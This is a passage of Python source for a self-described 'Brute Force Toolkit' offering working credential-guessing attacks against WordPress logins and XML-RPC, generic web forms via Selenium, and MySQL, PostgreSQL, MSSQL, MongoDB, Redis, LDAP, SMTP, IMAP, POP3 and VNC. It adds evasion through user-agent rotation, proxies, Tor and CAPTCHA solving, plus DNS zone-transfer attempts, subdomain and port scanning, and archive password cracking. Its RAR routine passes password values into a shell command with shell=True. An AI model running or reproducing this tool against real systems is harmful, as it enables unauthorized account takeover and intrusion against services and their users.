                response = self.session.get(login_url, headers=headers, timeout=self.timeout)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Check for login form
                login_form = soup.find('form', {'id': 'loginform'})
                if not login_form:
                    logger.error("WordPress login form not found")
                    break
                    
                # Prepare form data
                form_data = {
                    'log': username,
                    'pwd': password,
                    'wp-submit': 'Log In',
                    'redirect_to': url + '/wp-admin/',
                    'testcookie': '1'
                }
                
                # Add hidden fields
                for input_tag in login_form.find_all('input', {'type': 'hidden'}):
                    name = input_tag.get('name')
                    value = input_tag.get('value', '')
                    if name:
                        form_data[name] = value
                
                # Submit login
                response = self.session.post(login_url, data=form_data, headers=headers, timeout=self.timeout)
                
                # Check for successful login
                if 'wp-admin' in response.url or 'Dashboard' in response.text:
                    self.save_result('WordPress', url, username, password, {
                        'method': 'wp-login.php',
                        'response_url': response.url
                    })
                    
                    if pbar:
                        pbar.update(1)
                    return True
                    
                # Check for CAPTCHA
                if 'captcha' in response.text.lower():
                    captcha_solved = False
                    for img_tag in BeautifulSoup(response.text, 'html.parser').find_all('img'):
                        img_src = img_tag.get('src', '')
                        if 'captcha' in img_src.lower():
                            captcha_text = self.solve_captcha(image_url=img_src)
                            if captcha_text:
                                form_data['captcha'] = captcha_text
                                response = self.session.post(login_url, data=form_data, headers=headers)
                                if 'wp-admin' in response.url or 'Dashboard' in response.text:
                                    self.save_result('WordPress', url, username, password, {
                                        'method': 'wp-login.php',
                                        'response_url': response.url,
                                        'captcha_used': True
                                    })
                                    if pbar:
                                        pbar.update(1)
                                    return True
                            break
            except Exception as e:
                logger.error(f"WordPress error: {e}")
                time.sleep(self.rate_limit_delay)
                continue
        
        if pbar:
            pbar.update(1)
        return False
    
    def wordpress_xmlrpc_brute(self, url, username, password):
        """Brute force WordPress via XML-RPC"""
        xmlrpc_url = url if url.endswith('/xmlrpc.php') else url.rstrip('/') + '/xmlrpc.php'
        
        for attempt in range(self.max_retries):
            try:
                # Check if XML-RPC is enabled
                response = self.session.get(xmlrpc_url, timeout=self.timeout)
                if 'XML-RPC server accepts POST requests only' not in response.text:
                    return False
                    
                # Prepare XML-RPC request
                data = f"""<?xml version="1.0"?>
                <methodCall>
                    <methodName>wp.getUsersBlogs</methodName>
                    <params>
                        <param><value>{username}</value></param>
                        <param><value>{password}</value></param>
                    </params>
                </methodCall>"""
                
                headers = {
                    'Content-Type': 'application/xml',
                    'User-Agent': self.rotate_user_agent()
                }
                
                response = self.session.post(xmlrpc_url, data=data, headers=headers, timeout=self.timeout)
                
                # Check for successful response
                if 'isAdmin' in response.text or 'blogName' in response.text:
                    self.save_result('WordPress', url, username, password, {
                        'method': 'xmlrpc',
                        'response': response.text[:200]  # Save first 200 chars of response
                    })
                    return True
            except Exception as e:
                if self.verbose:
                    logger.debug(f"WordPress XML-RPC attempt failed: {e}")
                time.sleep(self.rate_limit_delay)
                continue
        
        return False
    
    def selenium_brute(self, url, username, password, pbar=None):
        """Brute force using Selenium for JavaScript-heavy sites"""
        options = ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--window-size=1920,1080')
        
        # Set user agent
        user_agent = self.rotate_user_agent()
        options.add_argument(f'user-agent={user_agent}')
        
        # Proxy configuration
        if self.proxy_list:
            proxy = self.rotate_proxy()
            if proxy:
                options.add_argument(f'--proxy-server={proxy}')
        elif self.use_tor:
            options.add_argument(f'--proxy-server=socks5://127.0.0.1:{self.tor_port}')
        
        driver = None
        for attempt in range(self.max_retries):
            try:
                driver = webdriver.Chrome(options=options)
                driver.set_page_load_timeout(self.timeout)
                driver.get(url)
                
                # Find username and password fields with flexible detection
                input_fields = driver.find_elements(By.TAG_NAME, 'input')
                username_field = None
                password_field = None
                submit_button = None
                
                for field in input_fields:
                    field_type = field.get_attribute('type').lower() if field.get_attribute('type') else ''
                    field_name = field.get_attribute('name').lower() if field.get_attribute('name') else ''
                    field_id = field.get_attribute('id').lower() if field.get_attribute('id') else ''
                    
                    if not username_field and any(x in field_type + field_name + field_id 
                                              for x in ['user', 'email', 'login']):
                        username_field = field
                    elif not password_field and 'pass' in field_type + field_name + field_id:
                        password_field = field
                    elif not submit_button and field_type == 'submit':
                        submit_button = field
                
                # Fallback if fields not found by standard methods
                if not username_field or not password_field:
                    username_field = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((By.XPATH, "//input[@type='text' or @type='email']"))
                    )
                    password_field = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((By.XPATH, "//input[@type='password']"))
                    )
                    submit_button = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((By.XPATH, "//button[@type='submit']"))
                    )
                
                # Fill and submit form
                username_field.send_keys(username)
                password_field.send_keys(password)
                
                # Try both clicking and submitting
                try:
                    submit_button.click()
                except:
                    password_field.submit()
                
                # Wait for login result
                time.sleep(3)  # Adjust based on site response
                
                # Check for successful login
                login_indicators = [
                    'logout', 'sign out', 'welcome', 'dashboard', 
                    'my account', username.lower()
                ]
                
                current_url = driver.current_url.lower()
                page_source = driver.page_source.lower()
                
                if any(indicator in current_url or indicator in page_source 
                      for indicator in login_indicators):
                    self.save_result('Web (Selenium)', url, username, password, {
                        'final_url': driver.current_url,
                        'method': 'selenium'
                    })
                    driver.quit()
                    
                    if pbar:
                        pbar.update(1)
                    return True
            except Exception as e:
                if self.verbose:
                    logger.error(f"Selenium error: {e}")
                time.sleep(self.rate_limit_delay)
                continue
            finally:
                try:
                    if driver:
                        driver.quit()
                except:
                    pass
        
        if pbar:
            pbar.update(1)
        return False
    
    def mysql_brute(self, host, username, password, pbar=None):
        """Brute force MySQL database"""
        for attempt in range(self.max_retries):
            try:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                conn = mysql.connector.connect(
                    host=host,
                    user=username,
                    password=password,
                    connection_timeout=self.timeout
                )
                
                # Get some basic info
                cursor = conn.cursor()
                cursor.execute("SELECT version()")
                version = cursor.fetchone()[0]
                
                cursor.execute("SHOW DATABASES")
                databases = [db[0] for db in cursor.fetchall()]
                
                self.save_result('MySQL', host, username, password, {
                    'version': version,
                    'databases': databases[:10]  # Limit to first 10 databases
                })
                conn.close()
                
                if pbar:
                    pbar.update(1)
                return True
            except mysql.connector.Error as e:
                if e.errno == 1045:  # Access denied
                    if self.verbose:
                        logger.debug(f"Failed MySQL attempt: {username}:{password}")
                    break
                else:
                    logger.error(f"MySQL error: {e}")
                    time.sleep(self.rate_limit_delay)
                    continue
            except Exception as e:
                logger.error(f"MySQL connection error: {e}")
                time.sleep(self.rate_limit_delay)
                continue
        
        if pbar:
            pbar.update(1)
        return False
    
    def postgresql_brute(self, host, username, password, pbar=None):
        """Brute force PostgreSQL database"""
        for attempt in range(self.max_retries):
            try:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                conn = psycopg2.connect(
                    host=host,
                    user=username,
                    password=password,
                    connect_timeout=self.timeout
                )
                
                # Get some basic info
                cursor = conn.cursor()
                cursor.execute("SELECT version()")
                version = cursor.fetchone()[0]
                
                cursor.execute("SELECT datname FROM pg_database")
                databases = [db[0] for db in cursor.fetchall()]
                
                self.save_result('PostgreSQL', host, username, password, {
                    'version': version,
                    'databases': databases[:10]  # Limit to first 10 databases
                })
                conn.close()
                
                if pbar:
                    pbar.update(1)
                return True
            except psycopg2.OperationalError as e:
                if "password authentication failed" in str(e):
                    if self.verbose:
                        logger.debug(f"Failed PostgreSQL attempt: {username}:{password}")
                    break
                else:
                    logger.error(f"PostgreSQL error: {e}")
                    time.sleep(self.rate_limit_delay)
                    continue
            except Exception as e:
                logger.error(f"PostgreSQL connection error: {e}")
                time.sleep(self.rate_limit_delay)
                continue
        
        if pbar:
            pbar.update(1)
        return False
    
    def mssql_brute(self, host, username, password, pbar=None):
        """Brute force Microsoft SQL Server"""
        for attempt in range(self.max_retries):
            try:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                conn_str = f"DRIVER={{ODBC Driver 17 for SQL Server}};SERVER={host};UID={username};PWD={password}"
                conn = pyodbc.connect(conn_str, timeout=self.timeout)
                
                # Get some basic info
                cursor = conn.cursor()
                cursor.execute("SELECT @@VERSION")
                version = cursor.fetchone()[0]
                
                cursor.execute("SELECT name FROM sys.databases")
                databases = [db[0] for db in cursor.fetchall()]
                
                self.save_result('MSSQL', host, username, password, {
                    'version': version,
                    'databases': databases[:10]  # Limit to first 10 databases
                })
                conn.close()
                
                if pbar:
                    pbar.update(1)
                return True
            except pyodbc.Error as e:
                if "Login failed" in str(e):
                    if self.verbose:
                        logger.debug(f"Failed MSSQL attempt: {username}:{password}")
                    break
                else:
                    logger.error(f"MSSQL error: {e}")
                    time.sleep(self.rate_limit_delay)
                    continue
            except Exception as e:
                logger.error(f"MSSQL connection error: {e}")
                time.sleep(self.rate_limit_delay)
                continue
        
        if pbar:
            pbar.update(1)
        return False
    
    def mongodb_brute(self, host, username, password, pbar=None):
        """Brute force MongoDB"""
        for attempt in range(self.max_retries):
            try:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                client = pymongo.MongoClient(
                    host=host,
                    username=username,
                    password=password,
                    serverSelectionTimeoutMS=self.timeout*1000
                )
                
                # Verify connection
                client.server_info()
                
                # Get list of databases
                databases = client.list_database_names()
                
                self.save_result('MongoDB', host, username, password, {
                    'version': client.server_info()['version'],
                    'databases': databases[:10]  # Limit to first 10 databases
                })
                client.close()
                
                if pbar:
                    pbar.update(1)
                return True
            except pymongo.errors.OperationFailure as e:
                if "Authentication failed" in str(e):
                    if self.verbose:
                        logger.debug(f"Failed MongoDB attempt: {username}:{password}")
                    break
                else:
                    logger.error(f"MongoDB error: {e}")
                    time.sleep(self.rate_limit_delay)
                    continue
            except Exception as e:
                logger.error(f"MongoDB connection error: {e}")
                time.sleep(self.rate_limit_delay)
                continue
        
        if pbar:
            pbar.update(1)
        return False
    
    def redis_brute(self, host, username, password, pbar=None):
        """Brute force Redis"""
        for attempt in range(self.max_retries):
            try:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                r = redis.Redis(
                    host=host,
                    password=password,
                    socket_timeout=self.timeout
                )
                
                # Verify connection
                r.ping()
                
                # Get some info
                info = r.info()
                
                self.save_result('Redis', host, username, password, {
                    'version': info.get('redis_version', 'unknown'),
                    'info': {k: v for k, v in info.items() if not isinstance(v, (dict, list))}
                })
                
                if pbar:
                    pbar.update(1)
                return True
            except redis.exceptions.AuthenticationError:
                if self.verbose:
                    logger.debug(f"Failed Redis attempt: {username}:{password}")
                break
            except Exception as e:
                logger.error(f"Redis connection error: {e}")
                time.sleep(self.rate_limit_delay)
                continue
        
        if pbar:
            pbar.update(1)
        return False
    
    def ldap_brute(self, host, username, password, pbar=None):
        """Brute force LDAP service"""
        for attempt in range(self.max_retries):
            try:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                server = Server(host, get_info=ALL)
                conn = Connection(server, user=username, password=password)
                
                if conn.bind():
                    # Get some basic info
                    server_info = server.info
                    naming_contexts = server_info.naming_contexts
                    
                    self.save_result('LDAP', host, username, password, {
                        'naming_contexts': naming_contexts,
                        'server_info': str(server_info)
                    })
                    conn.unbind()
                    
                    if pbar:
                        pbar.update(1)
                    return True
            except Exception as e:
                if 'invalidCredentials' in str(e):
                    if self.verbose:
                        logger.debug(f"Failed LDAP attempt: {username}:{password}")
                    break
                else:
                    logger.error(f"LDAP error: {e}")
                    time.sleep(self.rate_limit_delay)
                    continue
        
        if pbar:
            pbar.update(1)
        return False
    
    def smtp_brute(self, host, username, password, pbar=None):
        """Brute force SMTP service"""
        for attempt in range(self.max_retries):
            try:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                smtp = smtplib.SMTP(host, timeout=self.timeout)
                smtp.ehlo()
                
                # Try STARTTLS if available
                try:
                    smtp.starttls()
                    smtp.ehlo()
                except smtplib.SMTPNotSupportedError:
                    pass
                    
                smtp.login(username, password)
                smtp.quit()
                
                self.save_result('SMTP', host, username, password)
                
                if pbar:
                    pbar.update(1)
                    return True
            except smtplib.SMTPAuthenticationError:
                if self.verbose:
                    logger.debug(f"Failed SMTP attempt: {username}:{password}")
                break
            except Exception as e:
                logger.error(f"SMTP error: {e}")
                time.sleep(self.rate_limit_delay)
                continue
        
        if pbar:
            pbar.update(1)
        return False
    
    def imap_brute(self, host, username, password, pbar=None):
        """Brute force IMAP service"""
        for attempt in range(self.max_retries):
            try:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                imap = imaplib.IMAP4(host)
                imap.login(username, password)
                imap.logout()
                
                self.save_result('IMAP', host, username, password)
                
                if pbar:
                    pbar.update(1)
                return True
            except imaplib.IMAP4.error:
                if self.verbose:
                    logger.debug(f"Failed IMAP attempt: {username}:{password}")
                break
            except Exception as e:
                logger.error(f"IMAP error: {e}")
                time.sleep(self.rate_limit_delay)
                continue
        
        if pbar:
            pbar.update(1)
        return False
    
    def pop3_brute(self, host, username, password, pbar=None):
        """Brute force POP3 service"""
        for attempt in range(self.max_retries):
            try:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                pop = poplib.POP3(host)
                pop.user(username)
                pop.pass_(password)
                pop.quit()
                
                self.save_result('POP3', host, username, password)
                
                if pbar:
                    pbar.update(1)
                return True
            except poplib.error_proto:
                if self.verbose:
                    logger.debug(f"Failed POP3 attempt: {username}:{password}")
                break
            except Exception as e:
                logger.error(f"POP3 error: {e}")
                time.sleep(self.rate_limit_delay)
                continue
        
        if pbar:
            pbar.update(1)
        return False

    
    def vnc_brute(self, host, password, pbar=None):
        """Brute force VNC service"""
        for attempt in range(self.max_retries):
            try:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                # Using vncdotool would be better, but requires additional dependencies
                # This is a simple socket-based approach
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect((host, 5900))
                
                # Read protocol version
                version = s.recv(1024)
                
                # Send our version
                s.send(b"RFB 003.008\n")
                
                # Read security types
                security_types = s.recv(1024)
                
                # Send VNC authentication
                s.send(b"\x02")  # VNC authentication
                
                # Read challenge
                challenge = s.recv(16)
                
                # Encrypt password
                key = password.ljust(8, '\x00')[:8]
                encrypted = bytes()
                for i in range(16):
                    encrypted += bytes([ord(key[i % 8]) ^ challenge[i]])
                
                # Send response
                s.send(encrypted)
                
                # Read result
                result = s.recv(4)
                if result == b"\x00\x00\x00\x00":  # Success
                    self.save_result('VNC', host, None, password)
                    s.close()
                    
                    if pbar:
                        pbar.update(1)
                    return True
                
                s.close()
            except Exception as e:
                logger.error(f"VNC error: {e}")
                time.sleep(self.rate_limit_delay)
                continue
        
        if pbar:
            pbar.update(1)
        return False
    
    # ================== Additional Features ==================
    def dns_enumeration(self, domain, record_types=None):
        """Perform DNS enumeration on a domain"""
        if not record_types:
            record_types = ['A', 'AAAA', 'MX', 'NS', 'SOA', 'TXT', 'CNAME', 'PTR', 'SRV']
            
        results = {}
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(domain, record_type)
                results[record_type] = [str(r) for r in answers]
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                continue
            except Exception as e:
                logger.error(f"DNS {record_type} query failed: {e}")
                
        # Try zone transfer if nameservers are found
        if 'NS' in results:
            for ns in results['NS']:
                try:
                    axfr_answers = dns.resolver.resolve(domain, 'AXFR', nameserver=ns)
                    results['AXFR'] = [str(r) for r in axfr_answers]
                    logger.warning(f"Zone transfer possible with {ns}!")
                    break
                except:
                    continue
                    
        return results
    
    def subdomain_brute(self, domain, wordlist_file, check_wildcard=True):
        """Brute force subdomains with wildcard detection"""
        if check_wildcard:
            # Check for wildcard DNS
            random_sub = f"{binascii.hexlify(os.urandom(8)).decode()}.{domain}"
            try:
                socket.gethostbyname(random_sub)
                logger.warning(f"Wildcard DNS detected for {domain}!")
                return []
            except socket.gaierror:
                pass  # No wildcard
            except Exception as e:
                logger.error(f"Wildcard check error: {e}")
                
        try:
            wordlist = self.load_wordlist(wordlist_file)
            if not wordlist:
                raise ValueError("Wordlist is empty")
        except Exception as e:
            logger.error(f"Failed to load subdomain wordlist: {e}")
            return []
            
        valid_subdomains = []
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {executor.submit(self.check_subdomain, f"{sub}.{domain}"): sub for sub in wordlist}
            
            for future in tqdm(as_completed(futures), total=len(wordlist), desc="Checking subdomains"):
                subdomain = futures[future]
                try:
                    if future.result():
                        valid_subdomains.append(subdomain)
                        logger.info(f"{Colors.GREEN}[+] Found subdomain: {subdomain}{Colors.RESET}")
                except Exception as e:
                    logger.error(f"Subdomain check error for {subdomain}: {e}")
                    
        return valid_subdomains
    
    def check_subdomain(self, subdomain):
        """Check if a subdomain exists with additional verification"""
        try:
            ip = socket.gethostbyname(subdomain)
            
            # Additional verification by checking HTTP/HTTPS
            try:
                for scheme in ['http', 'https']:
                    url = f"{scheme}://{subdomain}"
                    try:
                        response = requests.head(url, timeout=5, allow_redirects=True)
                        if response.status_code < 400:
                            return True
                    except:
                        continue
            except:
                pass
                
            return ip is not None
        except socket.gaierror:
            return False
        except Exception as e:
            logger.error(f"Subdomain resolution error for {subdomain}: {e}")
            return False
    
    def zip_brute(self, zip_file, password_list):
        """Brute force ZIP file password"""
        try:
            with zipfile.ZipFile(zip_file) as zf:
                for password in tqdm(password_list, desc="Testing ZIP passwords"):
                    password = password.strip()
                    try:
                        # Test with first file in archive
                        first_file = zf.namelist()[0]
                        with zf.open(first_file, pwd=password.encode()) as f:
                            f.read(16)  # Read small chunk to verify
                        logger.info(f"{Colors.GREEN}[+] ZIP password found: {password}{Colors.RESET}")
                        return password
                    except (RuntimeError, zipfile.BadZipFile):
                        continue
                    except Exception as e:
                        logger.error(f"ZIP extraction error: {e}")
                        continue
        except Exception as e:
            logger.error(f"ZIP file error: {e}")
            
        return None
    
    def rar_brute(self, rar_file, password_list):
        """Brute force RAR file password (requires unrar)"""
        try:
            for password in tqdm(password_list, desc="Testing RAR passwords"):
                password = password.strip()
                try:
                    # Use unrar command line tool
                    cmd = f'unrar t -p{password} "{rar_file}"'
                    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    if "All OK" in result.stdout.decode():
                        logger.info(f"{Colors.GREEN}[+] RAR password found: {password}{Colors.RESET}")
                        return password
                except Exception as e:
                    logger.error(f"RAR extraction error: {e}")
                    continue
        except Exception as e:
            logger.error(f"RAR file error: {e}")
            
        return None
    
    def port_scan(self, target, ports='1-1024', scan_type='connect'):
        """Perform port scanning using nmap or socket"""
        open_ports = []
        
        try:
            if scan_type == 'nmap':
                nm = nmap.PortScanner()
                nm.scan(hosts=target, ports=ports, arguments='-T4')
                
                for host in nm.all_hosts():
                    for proto in nm[host].all_protocols():
                        port_list = nm[host][proto].keys()
                        for port in port_list:
                            if nm[host][proto][port]['state'] == 'open':
                                open_ports.append((port, proto, nm[host][proto][port]['name']))
            else:
                # Simple socket-based scan
                port_range = self.parse_port_range(ports)
                for port in port_range:
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.settimeout(1)
                            result = s.connect_ex((target, port))
                            if result == 0:
                                try:
                                    service = socket.getservbyport(port)
                                except:
                                    service = 'unknown'
                                open_ports.append((port, 'tcp', service))
                    except:
                        continue
                        
            return sorted(open_ports, key=lambda x: x[0])
        except Exception as e:
            logger.error(f"Port scan error: {e}")
            return []
    
    def parse_port_range(self, port_spec):
        """Parse port range specification into list of ports"""
        ports = set()
        
        for part in port_spec.split(','):
            if '-' in part:
                start, end = map(int, part.split('-'))
                ports.update(range(start, end + 1))
            else:
                ports.add(int(part))
                
        return sorted(ports)
    
    def network_scan(self, network):
        """Scan local network for active hosts using ARP"""
        active_hosts = []
        
        try:
            # Create ARP packet
            arp = ARP(pdst=network)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            
            # Send packet and get responses
            result = srp(packet, timeout=3, verbose=0)[0]
            
            # Parse responses
            for sent, received in result:
                active_hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
                
        except Exception as e:
            logger.error(f"Network scan error: {e}")
            
        return active_hosts
    
    def website_info(self, url):
        """Gather information about a website"""
        info = {
            'url': url,
            'technologies': [],
            'headers': {},
            'ssl_info': {},
            'whois': {}
        }
        
        try:
            # Get HTTP headers
            response = self.session.head(url, timeout=self.timeout, allow_redirects=True)
            info['headers'] = dict(response.headers)
            info['final_url'] = response.url
            
            # Get page content for technology detection
            response = self.session.get(url, timeout=self.timeout)
            info['content_type'] = response.headers.get('Content-Type', '')
            info['status_code'] = response.status_code
            
            # Simple technology detection
            tech_detected = set()
            common_tech = {
                'wordpress': ['wp-content', 'wp-includes', 'wordpress'],
                'joomla': ['joomla', 'media/jui/js'],
                'drupal': ['drupal', 'sites/all'],
                'nginx': ['nginx'],
                'apache': ['apache', 'server: apache'],
                'php': ['php', '.php/'],
                'asp.net': ['asp.net', '__viewstate'],
                'jquery': ['jquery.js'],
                'bootstrap': ['bootstrap.css']
            }
            
            for tech, indicators in common_tech.items():
                if any(indicator.lower() in response.text.lower() for indicator in indicators):
                    tech_detected.add(tech)
                    
            info['technologies'] = sorted(list(tech_detected))
            
            # SSL/TLS information
            if url.startswith('https://'):
                hostname = urlparse(url).netloc.split(':')[0]
                port = urlparse(url).port or 443
                
                cert = ssl.get_server_certificate((hostname, port))
                x509 = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, cert)
                
                info['ssl_info'] = {
                    'subject': dict(x509.get_subject().get_components()),
                    'issuer': dict(x509.get_issuer().get_components()),
                    'expires': x509.get_notAfter().decode('utf-8'),
                    'serial': x509.get_serial_number(),
                    'version': x509.get_version(),
                    'signature_algorithm': x509.get_signature_algorithm().decode('utf-8')
                }
            
            # WHOIS information
            domain = urlparse(url).netloc
            if ':' in domain:
                domain = domain.split(':')[0]
            info['whois'] = whois.whois(domain)
            
        except Exception as e:
            logger.error(f"Website info gathering error: {e}")
            
        return info
    
    def generate_report(self, output_format='html'):
        """Generate a report of findings"""
        try:
            # Load results from database
            conn = sqlite3.connect(self.results_db)
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM results ORDER BY timestamp DESC")
            results = cursor.fetchall()
            conn.close()
            
            # Prepare report data
            report_data = {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'total_findings': len(results),
                'results': []
            }
            
            for row in results:
                report_data['results'].append({
                    'id': row[0],
                    'service': row[1],
                    'target': row[2],
                    'username': row[3],
                    'timestamp': row[5],
                    'strength': row[6],
                    'additional_info': json.loads(row[7]) if row[7] else None
                })
            
            # Generate report based on format
            if output_format == 'html':
                report_file = os.path.join(RESULTS_DIR, 'report.html')
                self.generate_html_report(report_data, report_file)
            elif output_format == 'csv':
                report_file = os.path.join(RESULTS_DIR, 'report.csv')
                self.generate_csv_report(report_data, report_file)
            elif output_format == 'json':
                report_file = os.path.join(RESULTS_DIR, 'report.json')
                self.generate_json_report(report_data, report_file)
            else:
                report_file = os.path.join(RESULTS_DIR, 'report.txt')
                self.generate_text_report(report_data, report_file)
                
            logger.info(f"Report generated: {report_file}")
            return report_file
        except Exception as e:
            logger.error(f"Report generation failed: {e}")
            return None
    
    def generate_html_report(self, data, output_file):
        """Generate HTML report"""
        html_template = f"""<!DOCTYPE html>
<html>
<head>
    <title>Brute Force Toolkit Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1 {{ color: #333; }}
        table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
        th, td {{ padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }}
        th {{ background-color: #f2f2f2; }}
        tr:hover {{ background-color: #f5f5f5; }}
        .success {{ color: green; }}
        .warning {{ color: orange; }}
        .danger {{ color: red; }}
    </style>
</head>
<body>
    <h1>Brute Force Toolkit Report</h1>
    <p>Generated on: {data['timestamp']}</p>
    <p>Total findings: {data['total_findings']}</p>
    
    <table>
        <tr>
            <th>ID</th>
            <th>Service</th>
            <th>Target</th>
            <th>Username</th>
            <th>Timestamp</th>
            <th>Password Strength</th>
        </tr>
        {"".join(
            f'<tr><td>{r["id"]}</td><td>{r["service"]}</td><td>{r["target"]}</td>'
            f'<td>{r["username"]}</td><td>{r["timestamp"]}</td>'
            f'<td class="{"success" if r["strength"] > 7 else "warning" if r["strength"] > 4 else "danger"}">'
            f'{r["strength"]}/10</td></tr>'
            for r in data['results']
        )}
    </table>
</body>
</html>"""
        
        with open(output_file, 'w') as f:
            f.write(html_template)
    
    def generate_csv_report(self, data, output_file):
        """Generate CSV report"""
        with open(output_file, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['ID', 'Service', 'Target', 'Username', 'Timestamp', 'Password Strength'])
            for r in data['results']:
                writer.writerow([r['id'], r['service'], r['target'], r['username'], r['timestamp'], r['strength']])
    
    def generate_json_report(self, data, output_file):
        """Generate JSON report"""
        with open(output_file, 'w') as f:
            json.dump(data, f, indent=4)
    
    def generate_text_report(self, data, output_file):
        """Generate text report"""
        with open(output_file, 'w') as f:
            f.write(f"Brute Force Toolkit Report\n")
            f.write(f"Generated on: {data['timestamp']}\n")
            f.write(f"Total findings: {data['total_findings']}\n\n")
            
            for r in data['results']:
                f.write(f"ID: {r['id']}\n")
                f.write(f"Service: {r['service']}\n")
                f.write(f"Target: {r['target']}\n")
                f.write(f"Username: {r['username']}\n")
                f.write(f"Timestamp: {r['timestamp']}\n")
                f.write(f"Password Strength: {r['strength']}/10\n")
                if r['additional_info']:
                    f.write(f"Additional Info: {json.dumps(r['additional_info'], indent=2)}\n")
                f.write("\n" + "-"*50 + "\n")

# ================== Interactive Shell ==================
class InteractiveShell:
    def __init__(self, engine):
        self.engine = engine
        self.commands = {
            'help': self.show_help,
            'exit': self.exit_shell,
            'quit': self.exit_shell,
            'set': self.set_parameter,
            'show': self.show_info,
            'run': self.run_attack,
            'scan': self.run_scan,
            'info': self.get_info,
            'report': self.generate_report,
            'clear': self.clear_screen
        }
        self.history = FileHistory('.brute_history')
        self.completer = WordCompleter(list(self.commands.keys()))
        
    def show_help(self, args):
        """Show help information"""
        print(f"{Colors.BLUE}Available commands:{Colors.RESET}")
        print(f"  {Colors.GREEN}help{Colors.RESET} - Show this help message")
        print(f"  {Colors.GREEN}exit/quit{Colors.RESET} - Exit the shell")
        print(f"  {Colors.GREEN}set{Colors.RESET} - Set parameters (target, username, password, etc.)")
        print(f"  {Colors.GREEN}show{Colors.RESET} - Show current settings")
        print(f"  {Colors.GREEN}run{Colors.RESET} - Run brute force attack")
        print(f"  {Colors.GREEN}scan{Colors.RESET} - Run network scan")
        print(f"  {Colors.GREEN}info{Colors.RESET} - Get information about a target")
        print(f"  {Colors.GREEN}report{Colors.RESET} - Generate report")
        print(f"  {Colors.GREEN}clear{Colors.RESET} - Clear the screen")
    
    def exit_shell(self, args):
        """Exit the interactive shell"""
        print(f"{Colors.YELLOW}Exiting interactive shell...{Colors.RESET}")
        return True
    
    def set_parameter(self, args):
        """Set a parameter"""
        if len(args) < 2:
            print(f"{Colors.RED}Usage: set <parameter> <value>{Colors.RESET}")
            return
            
        param = args[0].lower()
        value = ' '.join(args[1:])
        
        # Here you would implement setting various parameters
        print(f"{Colors.YELLOW}Setting {param} to {value} (not implemented yet){Colors.RESET}")
    
    def show_info(self, args):
        """Show current settings"""
        print(f"{Colors.BLUE}Current Settings:{Colors.RESET}")
        print(f"  Threads: {self.engine.max_threads}")
        print(f"  Timeout: {self.engine.timeout}")
        print(f"  Delay: {self.engine.delay}")
        print(f"  Verbose: {self.engine.verbose}")
        print(f"  Tor: {self.engine.use_tor} (port: {self.engine.tor_port})")
    
    def run_attack(self, args):
        """Run brute force attack"""
        if len(args) < 1:
            print(f"{Colors.RED}Usage: run <service>{Colors.RESET}")
            return
            
        service = args[0].lower()
        print(f"{Colors.YELLOW}Running {service} brute force (not fully implemented){Colors.RESET}")
    
    def run_scan(self, args):
        """Run network scan"""
        if len(args) < 1:
            print(f"{Colors.RED}Usage: scan <target>{Colors.RESET}")
            return
            
        target = args[0]
        print(f"{Colors.YELLOW}Scanning {target} (not fully implemented){Colors.RESET}")
    
    def get_info(self, args):
        """Get information about a target"""
        if len(args) < 1:
            print(f"{Colors.RED}Usage: info <target>{Colors.RESET}")
            return
            
        target = args[0]
        print(f"{Colors.YELLOW}Getting info for {target} (not fully implemented){Colors.RESET}")
    
    def generate_report(self, args):
        """Generate report"""
        format = 'html'
        if len(args) > 0:
            format = args[0].lower()
            
        report_file = self.engine.generate_report(format)
        if report_file:
            print(f"{Colors.GREEN}Report generated: {report_file}{Colors.RESET}")
        else:
            print(f"{Colors.RED}Failed to generate report{Colors.RESET}")
    
    def clear_screen(self, args):
        """Clear the screen"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def start(self):
        """Start the interactive shell"""
        print(f"{Colors.GREEN}Brute Force Toolkit Interactive Shell{Colors.RESET}")
        print(f"Type 'help' for available commands")
        
        while True:
            try:
                user_input = prompt('brute> ', 
                                  history=self.history,
                                  auto_suggest=AutoSuggestFromHistory(),
                                  completer=self.completer)
                
                if not user_input.strip():
                    continue
                    
                parts = shlex.split(user_input)
                cmd = parts[0].lower()
                args = parts[1:] if len(parts) > 1 else []
                
                if cmd in self.commands:
                    if self.commands[cmd](args):
                        break
                else:
                    print(f"{Colors.RED}Unknown command: {cmd}{Colors.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}Use 'exit' or 'quit' to exit{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}Error: {e}{Colors.RESET}")

# ================== Main Function ==================
def main():
    initialize()
    engine = BruteForceEngine()
    
    # Load previous session if available
